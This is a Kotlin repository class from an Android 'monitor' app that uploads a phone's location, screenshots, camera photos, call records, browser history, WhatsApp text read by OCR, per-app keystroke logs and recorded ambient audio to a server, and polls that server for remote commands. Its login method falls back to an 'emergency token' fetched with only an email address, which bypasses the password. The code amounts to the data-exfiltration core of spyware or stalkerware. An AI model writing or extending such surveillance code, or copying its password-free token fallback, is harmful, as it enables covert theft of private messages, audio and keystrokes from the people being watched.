package com.empresa.monitor.data.repository

import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.local.PreferencesManager
import com.empresa.monitor.data.model.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class MonitorRepository @Inject constructor(
    private val prefs: PreferencesManager
) {
    private val api get() = ApiClient.api

    suspend fun login(email: String, password: String): Result<String> {
        return try {
            // Try normal login first
            val resp = api.login(LoginRequest(email, password))
            if (resp.isSuccessful) {
                val token = resp.body()!!.accessToken
                ApiClient.setToken(token)
                prefs.authToken = token
                return Result.success(token)
            }
            // Fallback to emergency token endpoint
            val resp2 = api.getEmergencyToken(email)
            if (resp2.isSuccessful) {
                val token = resp2.body()!!.accessToken
                ApiClient.setToken(token)
                prefs.authToken = token
                return Result.success(token)
            }
            Result.failure(Exception("Login falló"))
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun registerDevice(req: DeviceRegisterRequest): Result<String> {
        return try {
            val resp = api.registerDevice(req)
            if (resp.isSuccessful) {
                val deviceId = resp.body()!!.id
                prefs.deviceId = deviceId
                Result.success(deviceId)
            } else {
                Result.failure(Exception("Registro falló: ${resp.code()}"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendHeartbeat(): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device registered"))
        return try {
            api.heartbeat(deviceId)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendLocation(req: LocationRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendLocation(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendUsage(req: AppUsageRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendUsage(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendScreenshot(req: ScreenshotRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendScreenshot(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendCameraImage(req: CameraImageRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendCameraImage(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendCallRecord(req: CallRecordRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendCallRecord(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendBrowserHistory(req: BrowserHistoryRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendBrowserHistory(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendWhatsAppOcr(req: WhatsAppOcrRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendWhatsAppOcr(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendAlert(req: AlertRequest): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendAlert(deviceId, req)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendBattery(level: Int, isCharging: Boolean): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendBattery(deviceId, BatteryRequest(level, isCharging))
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun checkPendingCommand(): Map<String, Any>? {
        val deviceId = prefs.deviceId ?: return null
        return try {
            val resp = api.checkPendingCommand(deviceId)
            if (resp.isSuccessful) resp.body() else null
        } catch (e: Exception) {
            null
        }
    }

    suspend fun sendKeyLog(appPackage: String?, appName: String?, text: String, eventType: String = "text_changed"): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            api.sendKeyLog(deviceId, KeyLogRequest(appPackage, appName, text, eventType))
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendAmbientAudio(file: File): Result<Unit> {
        val deviceId = prefs.deviceId ?: return Result.failure(Exception("No device"))
        return try {
            val mimeType = "audio/mp4"
            val requestBody = file.readBytes().toRequestBody(mimeType.toMediaTypeOrNull())
            val part = MultipartBody.Part.createFormData("audio", file.name, requestBody)
            api.sendAmbientAudio(deviceId, part)
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
